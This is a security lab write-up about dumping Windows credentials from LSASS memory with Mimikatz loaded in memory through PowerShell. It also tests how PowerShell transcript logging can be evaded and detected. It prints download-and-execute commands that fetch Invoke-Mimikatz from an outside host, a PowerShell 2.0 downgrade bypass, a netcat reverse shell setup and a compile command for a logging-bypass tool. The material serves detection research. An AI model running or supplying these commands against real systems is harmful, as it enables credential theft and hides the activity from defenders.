---
description: >-
  Local Security Authority (LSA) credential dumping with in-memory Mimikatz
  using powershell.
---

# Dumping Credentials from Lsass.exe Process Memory

## Execution

{% code title="attacker@victim" %}
```csharp
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```
{% endcode %}

Hashes and plain text passwords of the compromised system are dumped to the console:

![](../../.gitbook/assets/pwdump-mimikatz-results.png)

## Observations

The process commandline is blatantly showing what is happening in this case, however, you should assume that file names and script argument names will be changed/obfuscated by a sophisticated attacker:

![victim host inspection](../../.gitbook/assets/pwdump-mimikatz.png)

As a defender, if your logs show a script being downloaded and executed in memory in a "relatively" short timespan, this should raise your suspicion and the host should be investigated further to make sure it is not compromised:

![](../../.gitbook/assets/pwdump-mimikatz-sysmon.png)

### Transcript Logging \#1

PowerShell transcript logging should allow you to see the commands entered into the console and their outputs, however I got some unexpected results at first.

For the first test, I setup transcript logging in my powershell \(version 2.0\) profile:

{% code title="C:\\Users\\mantvydas\\Documents\\WindowsPowerShell\\Microsoft.PowerShell\_profile.ps1" %}
```bash
Start-Transcript -Path C:\transcript.txt
```
{% endcode %}

{% hint style="warning" %}
Note that enabling transcription logging is not recommended from powershell profiles, since `powershell -nop` will easily bypass this defence - best if logging is enabled via GPOs.
{% endhint %}

### Cannot Start Transcript

First thing I noticed was that if at least one powershell instance was already running on the victim system, the transcript could not be started \(assume because the file is in use already\), which makes sense, but is not helpful for the victim at all:

![](../../.gitbook/assets/pwdump-transcript-cant-start.png)

This could be fixed by amending the PS profile so that the the transcript gets saved to a file the OS chooses itself rather than hardcoding it or in other words, doing `Start-Transcript` without specifying the path will do just fine.

### Empty Transcript - Weird

Below shows three windows stacked - top to bottom: 

1. Attacker's console via a netcat reverse shell using cmd.exe, issuing a command to dump credentials with mimikatz powershell script. Note how it says that the transcript was started and the mimikatz output follows;
2. **Empty \(!\)** transcript logging file transcript.txt on the victim system;
3. Process explorer on the victim system showing the process ancestry of the reverse shell cmd.exe PID `616` which had spawned the powershell process \(mentioned in point 1\) that ran the mimikatz script;

![](../../.gitbook/assets/pwdump-transcript-empty.png)

As can be seen from the above screenshot, the transcript.txt is empty although mimikatz ran successfully and dumped the credentials.   
  
This brings up a question if I am doing something wrong or if this is a limitation of some sort in transcript logging, so I will be trying to:

* dump credentials from a different process ancestry
* dump credentials locally on the victim system \(as if I was doing it via RDP\)
* upgrade powershell to 5.0+

### Dumping Credentials Locally

This works as expected and the transcript.txt gets populated with mimikatz output:

![](../../.gitbook/assets/pwdump-mimikatz-transcript.png)

### Dumping Credentials From a Different Process Ancestry

Tried dumping creds from the ancestry:   
`powershell > nc > cmd > powershell` instead of `cmd > nc > cmd > powershell` - to no avail.

### Transcript Logging \#2

I have updated my Powershell version from 2.0 to 5.1 and repeated credential dumping remotely `(cmd > nc > cmd > powershell)` process ancestry, same like the first time, where the transcript.txt came back empty. This time, however, the results are different - the output is logged this time:

![Powershell 5.1 transcribing powershell console remotely with no issues](../../.gitbook/assets/pwdump-transcript-working.png)

### Back to PowerShell 2.0

Even though the victim system now has Powershell 5.0 that is capable of transcript logging, we can abuse the `-version 2` switch of the powershell.exe binary like so: 

```bash
powershell -version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

 ... and the transcript will again become useless:

![](../../.gitbook/assets/pwdump-ps2-no-transcript.png)

This abuse, however, allows defenders to look for logs showing commandline arguments that suggest powershell is being downgraded and flag them as suspicious activity:

![](../../.gitbook/assets/pwdump-powershell-downgrade.png)

### Bypassing w/o Downgrading

Another technique allowing to bypass the transcript logging without downgrading is possible by using a compiled c\# program by [Ben Turner](https://gist.githubusercontent.com/benpturner/d62eb027a518b3743520a34d3aecb915/raw/32d96dafe148c784706b0dc7ed1d0fbbab51c354/posh.cs):

{% file src="../../.gitbook/assets/posh.cs" caption="Transcript Bypass without Downgrade - C\#" %}

Compile the code .cs code:

```csharp
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:C:\experimemts\transcript-bypass\bypass.exe C:\experiments\transcript-bypass.cs /reference:System.Management.Automation.dll
```

If you are having problems locating the `System.Management.Automation.dll` - you can find its location by using powershell: `PS C:\Users\mantvydas> [psobject].assembly.location`

We can then launch the transcript-bypass and use powershell and not worry about the transcript, because although the file will be created, it will be showing this:

![](../../.gitbook/assets/pwdump-bypass-no-downgrade.png)

I wanted to check if I could find any traces of non-powershell.exe processes creating transcript files in the logs, so I updated the sysmon config:

{% code title="sysmonconfig.xml" %}
```markup
<FileCreate onmatch="include">
    <TargetFilename condition="end with">.txt</TargetFilename>
</FileCreate>
```
{% endcode %}

...and while I could see powershell.exe creating transcript files:

![](../../.gitbook/assets/powershell-transcript-logs.png)

I could not get sysmon to log the transcript.txt file creation event caused by the `bypass.exe` although the file got successfully created!

## References

{% embed url="https://attack.mitre.org/wiki/Technique/T1003" %}

{% embed url="https://www.fireeye.com/blog/threat-research/2016/02/greater\_visibilityt.html" %}

